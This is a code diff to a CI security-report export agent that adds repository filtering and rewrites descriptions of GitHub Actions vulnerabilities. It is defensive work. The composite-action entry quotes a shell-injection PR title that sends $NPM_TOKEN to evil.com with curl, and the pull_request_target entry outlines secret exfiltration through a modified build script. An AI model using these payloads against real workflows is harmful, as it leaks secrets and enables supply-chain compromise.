@@ -8,7 +8,10 @@ async def run(input_dict, tools):
     http_client = httpx.AsyncClient()
     try:
         owner = input_dict.get("owner", "apache")
-        print(f"Agent 4 (JSON export) starting for owner={owner}", flush=True)
+        repos_str = input_dict.get("repos", "").strip()
+        repo_filter = set(r.strip() for r in repos_str.split(",") if r.strip()) if repos_str else None
+        print(f"JSON export starting for owner={owner}" +
+              (f" (filtered to {len(repo_filter)} repos)" if repo_filter else ""), flush=True)
 
         report_ns = data_store.use_namespace(f"ci-report:{owner}")
         security_ns = data_store.use_namespace(f"ci-security:{owner}")
@@ -18,14 +21,18 @@ async def run(input_dict, tools):
         sec_stats = security_ns.get("latest_stats")
 
         if not pub_stats or not sec_stats:
-            return {"outputText": "Error: Run Agent 1 and Agent 2 first."}
+            return {"outputText": "Error: Run Publishing and Security agents first."}
 
         # --- Collect all repos ---
         publishing_repos = set(pub_stats.get("publishing_repos", []))
+        if repo_filter:
+            publishing_repos = publishing_repos & repo_filter
 
-        # --- Read per-repo classifications from Agent 1 cache ---
+        # --- Read per-repo classifications from Publishing cache ---
         all_cls_keys = classification_ns.list_keys()
         meta_keys = [k for k in all_cls_keys if k.startswith("__meta__:")]
+        if repo_filter:
+            meta_keys = [k for k in meta_keys if k.replace("__meta__:", "") in repo_filter]
 
         repo_workflows = {}  # repo -> [workflow classifications]
         for mk in meta_keys:
@@ -46,9 +53,11 @@ async def run(input_dict, tools):
 
         print(f"Read classifications for {len(repo_workflows)} repos", flush=True)
 
-        # --- Read per-repo security findings from Agent 2 cache ---
+        # --- Read per-repo security findings from Security cache ---
         all_sec_keys = security_ns.list_keys()
         finding_keys = [k for k in all_sec_keys if k.startswith("findings:")]
+        if repo_filter:
+            finding_keys = [k for k in finding_keys if k.replace("findings:", "") in repo_filter]
 
         repo_findings = {}
         for k in finding_keys:
@@ -208,16 +217,16 @@ async def run(input_dict, tools):
             "prt_checkout": {
                 "label": "PR Target Code Execution",
                 "severity": "CRITICAL",
-                "description": "Workflow uses pull_request_target and checks out the PR head code.",
-                "attack": "An external contributor opens a PR that modifies a script executed by the workflow. Because pull_request_target runs with the base repo's secrets and write permissions, the attacker's code executes with full access to repository secrets, signing keys, and can push malicious releases.",
-                "example": "1. Attacker forks the repo\n2. Modifies build.sh to exfiltrate $NPM_TOKEN to an external server\n3. Opens PR — workflow checks out attacker's branch and runs build.sh\n4. Secrets are leaked; attacker publishes backdoored package",
+                "description": "Workflow uses pull_request_target and explicitly checks out PR head code via ref: parameter.",
+                "attack": "An external contributor opens a PR that modifies a script executed by the workflow. Because pull_request_target runs with the base repo's secrets and write permissions, the attacker's code executes with full access to repository secrets, signing keys, and can push malicious releases. Only flagged CRITICAL when the checkout ref: explicitly points to PR head. Default checkouts use the base branch and are safe.",
+                "example": "1. Attacker forks the repo\n2. Modifies build.sh to exfiltrate $NPM_TOKEN to an external server\n3. Opens PR — workflow checks out attacker's branch via ref: github.event.pull_request.head.sha\n4. Secrets are leaked; attacker publishes backdoored package",
             },
             "composite_action_input_injection": {
-                "label": "Composite Action Hidden Injection",
-                "severity": "HIGH",
-                "description": "Composite action interpolates inputs.* directly in run: blocks.",
-                "attack": "A workflow passes user-controlled values (PR title, branch name) to a composite action via with:. The composite action directly interpolates these in a shell run: block. The injection is hidden from workflow-level code review.",
-                "example": "1. Composite action has: run: echo \"Building ${{ inputs.version }}\"\n2. Workflow calls it with: version: ${{ github.event.pull_request.title }}\n3. Attacker sets PR title to: \"; curl http://evil.com/steal?t=$NPM_TOKEN #\n4. Shell executes the injected command with workflow secrets",
+                "label": "Composite Action Latent Injection",
+                "severity": "MEDIUM",
+                "description": "Composite action interpolates inputs.* directly in run: blocks. Not exploitable unless callers pass attacker-controlled values.",
+                "attack": "The composite action interpolates inputs.* in shell run: blocks. Not exploitable as long as every calling workflow passes only trusted values (hardcoded strings, workflow_dispatch inputs from committers). If a future workflow passes attacker-controlled input (PR title, branch name, comment body), the interpolation becomes a shell injection vector. This is a latent risk that requires an unsafe caller to become exploitable.",
+                "example": "1. Composite action has: run: echo \"Building ${{ inputs.version }}\"\n2. Today: called with version: \"1.2.3\" from workflow_dispatch (safe)\n3. Future PR adds: version: ${{ github.event.pull_request.title }} (unsafe)\n4. Attacker sets PR title to: \"; curl http://evil.com/steal?t=$NPM_TOKEN #",
             },
             "run_block_injection": {
                 "label": "Workflow Script Injection",
